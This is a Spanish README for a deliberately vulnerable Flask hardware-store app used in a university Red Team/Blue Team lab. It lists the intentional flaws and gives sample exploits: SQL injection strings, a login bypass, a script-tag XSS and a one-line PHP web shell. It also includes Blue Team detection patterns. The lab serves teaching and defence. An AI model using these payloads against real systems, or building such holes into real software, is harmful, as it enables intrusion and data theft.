# 🔨 Ferreterías Juan - Aplicación Web Vulnerable

## ⚠️ IMPORTANTE - SOLO PARA EDUCACIÓN

Esta aplicación web contiene **vulnerabilidades implementadas INTENCIONALMENTE** para fines educativos de ciberseguridad. Forma parte del proyecto académico **"Inteligencia de la Seguridad 2025-2026"** para ejercicios Red Team vs Blue Team.

**🚨 NO USAR EN PRODUCCIÓN - SOLO EN LABORATORIO AISLADO 🚨**

## 📋 Descripción del Proyecto

Ferreterías Juan es una aplicación web Flask que simula una tienda online de ferretería con las siguientes características:

### ✅ Funcionalidades Legítimas:
- Catálogo de productos de ferretería (20+ productos)
- Sistema de búsqueda de productos
- Comentarios de clientes
- Panel de administración
- Subida de archivos
- Login de usuarios con diferentes roles

### 🔓 Vulnerabilidades Implementadas:
- **SQL Injection** en búsqueda y login
- **XSS Stored** en comentarios
- **XSS Reflected** en búsquedas
- **File Upload sin restricciones**
- **Information Disclosure** (errores SQL visibles)
- **Weak Authentication** (credenciales débiles)
- **Debug Endpoints** expuestos

## 🏗️ Arquitectura

```
┌─────────────────┐    Puerto 80     ┌─────────────────┐
│                 │◄─────────────────►│                 │
│   Flask App     │                  │   Navegador     │
│  (Vulnerable)   │                  │     Web         │
│                 │                  │                 │
└─────────────────┘                  └─────────────────┘
         │
         │ Puerto 3306
         ▼
┌─────────────────┐
│                 │
│  MySQL/MariaDB  │
│   (ferreteria_  │
│      juan)      │
└─────────────────┘
```

## 🚀 Instalación Rápida

### Prerrequisitos:
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install python3 python3-pip python3-venv mariadb-server mariadb-client

# Verificar MySQL está funcionando
sudo systemctl start mariadb
sudo systemctl enable mariadb
```

### Instalación Automática:
```bash
# Clonar/descargar el proyecto
cd ferreteria_juan/

# Ejecutar instalación automática
chmod +x install.sh
sudo ./install.sh
```

### Instalación Manual:

1. **Configurar entorno virtual:**
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

2. **Configurar base de datos:**
```sql
mysql -u root
CREATE DATABASE ferreteria_juan;
CREATE USER 'ferreteria_user'@'localhost' IDENTIFIED BY 'ferreteria_pass123';
GRANT ALL PRIVILEGES ON ferreteria_juan.* TO 'ferreteria_user'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

3. **Preparar directorios:**
```bash
mkdir -p static/uploads
chmod 777 static/uploads
```

4. **Iniciar aplicación:**
```bash
python app.py
```

## 🎮 Uso de la Aplicación

### Acceso Web:
- **URL Principal:** http://localhost
- **Puerto Flask:** 80 
- **Puerto MySQL:** 3306

### Credenciales de Prueba:

| Usuario | Contraseña | Rol |
|---------|------------|-----|
| `admin` | `admin123` | Administrador |
| `juan` | `ferreteria2024` | Empleado |
| `test` | `test` | Cliente |

### URLs Importantes:
- **Inicio:** http://localhost/
- **Catálogo:** http://localhost/catalogo
- **Login:** http://localhost/login
- **Comentarios:** http://localhost/comentarios
- **Admin Panel:** http://localhost/admin
- **Upload:** http://localhost/upload
- **Debug (VULNERABLE):** http://localhost/debug

## 🔍 Vulnerabilidades y Exploits

### 1. SQL Injection en Búsqueda:
```
URL: http://localhost/catalogo?search=' OR 1=1 --
Payload: ' OR 1=1 --
Resultado: Muestra todos los productos
```

```
URL: http://localhost/catalogo?search=' UNION SELECT 1,version(),3,4,5,6,7,8 --
Payload: ' UNION SELECT 1,version(),3,4,5,6,7,8 --
Resultado: Muestra versión de MySQL
```

### 2. SQL Injection en Login:
```
Usuario: admin' --
Contraseña: cualquier_cosa
Resultado: Bypass de autenticación
```

### 3. XSS Stored en Comentarios:
```
Campo comentario: <script>alert('XSS en Ferreterías Juan')</script>
Resultado: Ejecución de JavaScript al ver comentarios
```

### 4. File Upload Vulnerable:
```bash
# Crear web shell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

# Subir archivo (sin restricciones)
# Acceder: http://localhost/static/uploads/shell.php?cmd=whoami
```

### 5. Information Disclosure:
```
URL: http://localhost/debug
Resultado: Información sensible del sistema
```

## 🛡️ Para el Equipo Blue Team

### Indicadores de Compromiso (IOCs):

1. **Patrones SQL Injection:**
   - `' OR 1=1 --`
   - `UNION SELECT`
   - `' AND 1=1 --`
   - Múltiples comillas simples en logs

2. **Patrones XSS:**
   - `<script>`
   - `javascript:`
   - `onerror=`
   - `<img src=x`

3. **File Upload Malicioso:**
   - Archivos `.php`, `.py`, `.sh`
   - Nombres sospechosos: `shell.php`, `backdoor.php`
   - Extensiones dobles: `.jpg.php`

4. **Comandos de Reconocimiento:**
   - `whoami`, `id`, `pwd`
   - `cat /etc/passwd`
   - `ps aux`, `netstat`

### Logs a Monitorizar:
```bash
# Log principal de la aplicación
tail -f ferreteria_juan.log

# Logs de MySQL (errores SQL)
tail -f /var/log/mysql/error.log

# Logs del sistema
tail -f /var/log/auth.log
tail -f /var/log/syslog
```

### Herramientas de Detección:
- **ModSecurity** para WAF
- **Fail2Ban** para ataques de fuerza bruta
- **OSSEC/Wazuh** para SIEM
- **Suricata** para IDS/IPS

## 🔧 Gestión y Mantenimiento

### Scripts Incluidos:
```bash
./install.sh    # Instalación completa
./start.sh      # Iniciar aplicación
./reset.sh      # Resetear BD y logs
```

### Comandos Útiles:
```bash
# Verificar estado de servicios
systemctl status mariadb

# Ver logs en tiempo real
tail -f ferreteria_juan.log

# Resetear completamente
./reset.sh && ./start.sh

# Backup de base de datos
mysqldump -u ferreteria_user -pferreteria_pass123 ferreteria_juan > backup.sql
```

### Estructura de Archivos:
```
ferreteria_juan/
├── app.py                 # Aplicación Flask principal
├── requirements.txt       # Dependencias Python
├── install.sh            # Script de instalación
├── start.sh              # Script de inicio
├── reset.sh              # Script de reset
├── README.md             # Esta documentación
├── templates/            # Templates HTML
│   ├── base.html
│   ├── index.html
│   ├── catalogo.html
│   ├── login.html
│   ├── comentarios.html
│   ├── admin.html
│   └── upload.html
├── static/               # Archivos estáticos
│   ├── css/
│   │   └── style.css
│   ├── js/
│   │   └── app.js
│   └── uploads/          # ⚠️ Directorio vulnerable
└── ferreteria_juan.log   # Log de la aplicación
```

## 🎯 Ejercicios Propuestos

### Para Red Team:

1. **Reconocimiento:**
   - Enumerar usuarios de la BD
   - Identificar versiones de software
   - Mapear estructura de archivos

2. **Explotación:**
   - Conseguir shell através de SQL injection
   - Escalación de privilegios local
   - Persistencia en el sistema

3. **Post-Explotación:**
   - Exfiltración de datos
   - Lateral movement (si hay más sistemas)
   - Limpiar logs de actividad

### Para Blue Team:

1. **Detección:**
   - Configurar alertas para patrones maliciosos
   - Implementar logging avanzado
   - Crear dashboards de monitorización

2. **Respuesta:**
   - Procedimientos de respuesta a incidentes
   - Aislamiento de sistemas comprometidos
   - Forense digital

3. **Recuperación:**
   - Restauración de servicios
   - Parches de seguridad
   - Mejoras en la detección

## 🚨 Consideraciones de Seguridad

### ⛔ NO HACER:
- ❌ Exponer a Internet
- ❌ Usar en red corporativa
- ❌ Almacenar datos reales
- ❌ Usar credenciales reales

### ✅ HACER:
- ✅ Usar solo en laboratorio aislado
- ✅ Configurar firewall restrictivo
- ✅ Monitorizar toda la actividad
- ✅ Documentar todos los hallazgos

## 📚 Referencias

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

## 🤝 Contribuciones

Este proyecto es parte de un ejercicio académico. Si encuentras mejoras o nuevas vulnerabilidades educativas, documéntalas apropiadamente.

## 📝 Licencia

Este proyecto es solo para fines educativos. No se otorga ninguna licencia para uso comercial o malicioso.

---

**🎓 Proyecto Académico:** Inteligencia de la Seguridad 2025-2026  
**🏫 Universidad:** [Nombre de tu Universidad]  
**👥 Equipo:** [Nombres del equipo]  
**📅 Fecha:** 2025

**⚠️ RECORDATORIO FINAL: Esta aplicación es VULNERABLE por diseño. Solo usar en entornos educativos controlados.**
